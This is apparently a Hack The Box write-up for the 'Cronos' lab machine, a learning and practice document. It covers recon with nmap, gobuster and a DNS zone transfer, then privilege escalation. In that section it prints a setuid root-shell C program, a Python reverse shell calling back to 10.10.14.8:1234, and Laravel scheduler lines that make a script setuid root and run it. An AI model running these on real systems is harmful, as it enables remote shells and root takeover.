# Cronos Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA cronos -T4 10.10.10.13``

![image](https://user-images.githubusercontent.com/123066149/230632139-e019a1c8-2d80-414b-bb28-239d838bca6e.png)

``nmap -p- -sV -T4 -oA fullcronos 10.10.10.13``

![image](https://user-images.githubusercontent.com/123066149/230632255-084b1257-7cbc-4367-b61b-68f62b8d71b3.png)

``nmap -sU --min-rate 5000 10.10.10.13``

``gobuster dir -u http://10.10.10.13/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,pl,py,sh,html,txt,js -t 70``

# ${{\color{purple}Initial Foothold}}\ $

``dig axfr @10.10.10.13 cronos.htb``

![image](https://user-images.githubusercontent.com/123066149/230632494-8ed1b6e5-8abe-49b5-ab73-8974cef37bb8.png)

![image](https://user-images.githubusercontent.com/123066149/230632611-1b07d868-8f25-43da-9f48-d9b8eaaf5320.png)

![image](https://user-images.githubusercontent.com/123066149/230632844-5d3d1999-0749-43ce-9153-4873c12c8cdf.png)

![image](https://user-images.githubusercontent.com/123066149/230632973-881eb81c-a7b9-4313-a1cd-71e326875107.png)

# ${{\color{purple}Exploitation}}\ $

![image](https://user-images.githubusercontent.com/123066149/230633225-5b52b6be-ab7b-4390-8bd7-b87555440e04.png)

### Don't forgot to encode with ``ctrl+U`` the payload :

![image](https://user-images.githubusercontent.com/123066149/230633562-74667d5f-4c6d-48cb-ab3f-bf3e057a6101.png)

![image](https://user-images.githubusercontent.com/123066149/230634467-6072d929-9c0c-4b1f-80dd-7ac0fae943e9.png)


# ${{\color{purple}Privilege Escalation}}\ $

### After several tests :

![image](https://user-images.githubusercontent.com/123066149/230634694-6920625d-281e-49c5-a687-4fb1b9372c2f.png)

![image](https://user-images.githubusercontent.com/123066149/230634779-11fe97a2-10f1-42f5-be3f-c7e665cef787.png)

![image](https://user-images.githubusercontent.com/123066149/230634825-5993b949-ca7f-4348-9740-615a00dd30e4.png)

``laravel create scheduling command``

![image](https://user-images.githubusercontent.com/123066149/230634984-e44a88f4-e6a0-401c-a5df-4ad72dc7588f.png)

![image](https://user-images.githubusercontent.com/123066149/230635108-fa52df3f-05b4-45f4-8e63-5c10950b2ee5.png)

![image](https://user-images.githubusercontent.com/123066149/230635150-71e5ac77-1e4f-4119-884f-060caf575eb4.png)

``find / -name Kernel.php 2>/dev/null``

![image](https://user-images.githubusercontent.com/123066149/230635422-2611c03b-2640-45d1-a146-5c9703dd2e91.png)

### I tested this setuid program but whiout success :

![image](https://user-images.githubusercontent.com/123066149/230635650-2cc15c20-0baf-4f7c-b1b6-4edea017165c.png)

``int main(void)
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}``


``gcc setuid_binary.c -o setuid_exploit``

![image](https://user-images.githubusercontent.com/123066149/230635987-e16b47d9-6485-464a-b0a5-d279f7da55b9.png)


``import socket,subprocess,os``

``s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)``

``s.connect(("10.10.14.8",1234))``

``os.dup2(s.fileno(),0)``

``os.dup2(s.fileno(),1)``

``os.dup2(s.fileno(),2)``

``import pty``

``pty.spawn("sh")``

![image](https://user-images.githubusercontent.com/123066149/230636554-50985f6e-9dc2-444a-9e95-74042e4afa72.png)

``$schedule->exec('ping -c 2 10.10.14.8')->everyMinute();``

``$schedule->exec('chown root:root /tmp/exploit.py; chmod 4755 /tmp/exploit.py')->everyMinute();``

``$schedule->exec('/usr/bin/python /tmp/exploit.py')->everyMinute();``	

![image](https://user-images.githubusercontent.com/123066149/230636977-b70f2739-bb25-411d-9a3c-81b9995d2964.png)


# ${{\color{purple}Points of Improvement}}\ $

* When port 53 is open you need to do more testing on the DNS!!!
* Other priv esc to watch : - ``unixprivesc.sh``  - ``linuxpvrichecker.py``
* Don't forget to encode the payload in burp
* In this case it was not possible to run a rev shell in the priv esc don't hesitate to run a complete program
